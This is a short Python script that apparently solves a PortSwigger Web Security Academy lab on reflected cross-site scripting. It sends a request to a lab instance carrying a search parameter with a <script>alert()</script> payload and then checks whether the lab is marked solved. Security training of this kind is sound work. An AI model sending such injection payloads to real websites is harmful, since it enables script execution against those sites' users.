#https://portswigger.net/web-security/cross-site-scripting/reflected/lab-html-context-nothing-encoded
from utils import *

url="https://0ace001303c692ab817357f2004d0011.web-security-academy.net/"
payload="?search=<script>alert('Whatever')</script>"
response=requests.get(f"{url}{payload}")

print(check_succes(parse_html(response)))